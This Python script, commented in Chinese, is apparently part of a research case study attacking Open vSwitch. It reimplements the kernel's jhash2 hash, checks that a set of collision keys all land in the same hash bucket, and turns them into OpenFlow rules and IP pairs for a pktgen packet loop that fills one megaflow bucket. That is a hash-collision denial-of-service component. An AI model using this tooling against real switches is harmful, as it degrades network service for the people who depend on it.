#!/usr/bin/env python3
"""keys_to_rules.py — 把 find_jhash_collision 找到的碰撞 key 轉成 OpenFlow 規則 + 封包配對。

Part 3（OVS case study）攻擊 (A) 的植入端:讀 find_jhash_collision --out 的 key 檔
(每行 22 個 hex u32),解出每筆的 src_ip / dst_ip,產出:
  1. OpenFlow 規則(exact-match nw_src+nw_dst,ports wildcard,對齊模板的 mask shape);
  2. (src_ip, dst_ip) 配對清單,供逐對送封包(pktgen 範圍隨機無法產生特定配對)。

**驗證閘**:每個 key 的「固定 word」必須與 --template 模板吻合,且全部 key 的
jhash2(完整 22 words, initval=0) 必須相等(= 同一 bucket 的前提)。任一不符即中止,
不輸出任何規則 —— 避免植入到在真實表裡不會碰撞的規則。

用法:
  keys_to_rules.py keys.txt --template dv3b_base_template.txt \\
      [--in-port 6] [--out-port 2] [--priority 100] \\
      [--rules-out coll_rules.txt] [--pairs-out coll_pairs.txt]

注意:--in-port 是 OpenFlow 入埠,需對應到 masked-key 裡 phy.in_port 的 datapath 埠
(本 testbed 模板顯示 dp in_port=6)。植入後務必用 ovs_keydump 複驗佈局仍 = 模板。
"""
import sys
import argparse

VAR_WORDS = (20, 21)   # src_ip, dst_ip(乾淨整字);其餘為固定常數模板

# ---- jhash2 逐字移植(seed=0;與 kernel flow_hash / find_jhash_collision 一致)----
M = 0xffffffff


def rol(w, s):
    return ((w << s) | (w >> (32 - s))) & M


def _mix(a, b, c):
    a = (a - c) & M; a ^= rol(c, 4);  c = (c + b) & M
    b = (b - a) & M; b ^= rol(a, 6);  a = (a + c) & M
    c = (c - b) & M; c ^= rol(b, 8);  b = (b + a) & M
    a = (a - c) & M; a ^= rol(c, 16); c = (c + b) & M
    b = (b - a) & M; b ^= rol(a, 19); a = (a + c) & M
    c = (c - b) & M; c ^= rol(b, 4);  b = (b + a) & M
    return a, b, c


def _final(a, b, c):
    c ^= b; c = (c - rol(b, 14)) & M
    a ^= c; a = (a - rol(c, 11)) & M
    b ^= a; b = (b - rol(a, 25)) & M
    c ^= b; c = (c - rol(b, 16)) & M
    a ^= c; a = (a - rol(c, 4)) & M
    b ^= a; b = (b - rol(a, 14)) & M
    c ^= b; c = (c - rol(b, 24)) & M
    return a, b, c


def jhash2(k, initval=0):
    length = len(k); a = b = c = (0xdeadbeef + (length << 2) + initval) & M; i = 0
    while length > 3:
        a = (a + k[i]) & M; b = (b + k[i + 1]) & M; c = (c + k[i + 2]) & M
        a, b, c = _mix(a, b, c); length -= 3; i += 3
    if length == 3:
        c = (c + k[i + 2]) & M; b = (b + k[i + 1]) & M; a = (a + k[i]) & M; a, b, c = _final(a, b, c)
    elif length == 2:
        b = (b + k[i + 1]) & M; a = (a + k[i]) & M; a, b, c = _final(a, b, c)
    elif length == 1:
        a = (a + k[i]) & M; a, b, c = _final(a, b, c)
    return c


def load_words(path):
    """讀每行多個 hex word 的檔,跳過 '#' 與空行;回傳 list[list[int]]。"""
    rows = []
    with open(path) as f:
        for line in f:
            s = line.split("#", 1)[0].strip()
            if not s:
                continue
            rows.append([int(x, 16) for x in s.split()])
    return rows


def load_template(path):
    """模板每行一個 word;回傳 list[int]。"""
    flat = []
    for row in load_words(path):
        flat.extend(row)
    return flat


def ip_of(word):
    """LE u32 word → dotted IPv4(masked-key 內 __be32 為網路序,LE bytes 即 a.b.c.d)。"""
    return ".".join(str(b) for b in word.to_bytes(4, "little"))


def main():
    ap = argparse.ArgumentParser(description="碰撞 key → OF 規則 + 封包配對")
    ap.add_argument("keys")
    ap.add_argument("--template", required=True)
    ap.add_argument("--in-port", type=int, default=6)
    ap.add_argument("--out-port", type=int, default=2)
    ap.add_argument("--priority", type=int, default=100)
    ap.add_argument("--bridge", default="br0")
    ap.add_argument("--rules-out")
    ap.add_argument("--pairs-out")
    a = ap.parse_args()

    tmpl = load_template(a.template)
    keys = load_words(a.keys)
    if not keys:
        sys.exit("ERROR: key 檔無資料")
    nwords = len(tmpl)

    # ---- 驗證閘 ----
    targets = set()
    fixed_idx = [i for i in range(nwords) if i not in VAR_WORDS]
    for n, k in enumerate(keys):
        if len(k) != nwords:
            sys.exit(f"ERROR: key #{n} 有 {len(k)} words,模板為 {nwords}")
        for i in fixed_idx:
            if k[i] != tmpl[i]:
                sys.exit(f"ERROR: key #{n} word {i}=0x{k[i]:08x} 與模板 0x{tmpl[i]:08x} 不符 "
                         f"— 模板/搜尋不一致,拒絕輸出")
        targets.add(jhash2(k))
    if len(targets) != 1:
        sys.exit(f"ERROR: key 的 jhash2 不全相等(見到 {len(targets)} 個值)— 非同 bucket,拒絕輸出")
    target = next(iter(targets))
    print(f"# 驗證通過:{len(keys)} keys,固定 word 全吻合模板,jhash2 全 = 0x{target:08x}",
          file=sys.stderr)

    # ---- 產出 ----
    rules, pairs = [], []
    for k in keys:
        sip, dip = ip_of(k[VAR_WORDS[0]]), ip_of(k[VAR_WORDS[1]])
        rules.append(f"priority={a.priority},ip,nw_proto=17,nw_src={sip},nw_dst={dip},"
                     f"in_port={a.in_port},actions=output:{a.out_port}")
        pairs.append(f"{sip} {dip}")

    rule_text = "\n".join(rules) + "\n"
    pair_text = "\n".join(pairs) + "\n"

    if a.rules_out:
        open(a.rules_out, "w").write(rule_text)
        print(f"# wrote {len(rules)} rules -> {a.rules_out}  "
              f"(套用:sudo ovs-ofctl add-flows {a.bridge} {a.rules_out})", file=sys.stderr)
    if a.pairs_out:
        open(a.pairs_out, "w").write(pair_text)
        print(f"# wrote {len(pairs)} pairs -> {a.pairs_out}", file=sys.stderr)
    if not a.rules_out and not a.pairs_out:
        print(rule_text, end="")

    # 封包提示:逐對送(範圍隨機無法產生特定配對);每對至少一封包觸發 megaflow 安裝。
    print(f"# 封包:每對送 UDP/IPv4(in_port={a.in_port}),src/dst = pair,埠任意(被 wildcard)。",
          file=sys.stderr)
    print("#   kernel pktgen 逐對範例(關掉 *_RND、src_min=src_max):", file=sys.stderr)
    print('#     for p in "$(cat PAIRS)"; do set -- $p; '
          'echo "src_min $1">$PGPKT; echo "src_max $1">$PGPKT; '
          'echo "dst_min $2">$PGPKT; echo "dst_max $2">$PGPKT; ... ; done', file=sys.stderr)


if __name__ == "__main__":
    main()
